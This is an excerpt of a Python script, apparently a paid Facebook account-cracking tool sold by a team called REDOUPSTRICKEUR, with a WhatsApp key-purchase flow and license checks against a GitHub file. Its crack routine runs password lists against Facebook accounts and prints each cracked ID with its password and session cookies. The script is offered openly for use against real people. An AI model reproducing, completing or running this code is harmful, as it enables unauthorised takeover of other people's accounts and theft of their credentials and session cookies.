...
princp=[]
try:
	prox= requests.get('https://raw.githubusercontent.com/Redoupstrickeur/Approved/main/approved.tex').text
	open('.approved.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mREDOUPS-TRICKEUR')
...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/Redoupstrickeur/Approved/main/approved.tex').text
...
def back():
	login()
REDOUPSTRICKEUR="REDOUPSTRICKEUR"
imt="REDOUPSHACKEUR"
ak="REDOUPSTRICKEUR-"
...
os.system('espeak -a 300 " Welcome,   to,  REDOUPSTRICKEUR,  TEAM,  Tools"')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m
╠══[Author   • \33[1;38mMR-REDOUPSTRICKEUR ]\33[1;38m   ║\033[1;31m
╠══[Facebook • REDOUPSTRICKEUR             ]            ║  \033[1;97m
╠══[Github   • \33[1;38mREDOUPSTRICKEUR    ]            ║\33[1;34m
╠══[Whatsapp • 033081234517                ]            ║\33[1;35m
╠══[TOOLS    • Paid                        ]            ║ \33[1;32m
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/REDOUPSTRICKEUR.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[REDOUPS-TRICKEUR] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•REDOUPS-TRICKEUR-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " REDOUPS-TRICKEUR,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://raw.githubusercontent.com/Redoupstrickeur/Approved/main/approved.tex").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m REDOUPSTRICKEUR TEAM, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 1000 Ar")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 1500 Ar")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+REDOUPSTRICKEUR+key1)
		...
		time.sleep(3.5)
		tks = 'MIARAHABAANAO%20REDOUPSTRICKEUR-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+REDOUPSTRICKEUR+''+key1
		os.system('am start https://wa.me/+261330940220?text=' + tks)
		Subscraption() 
Subscraption() 
login()
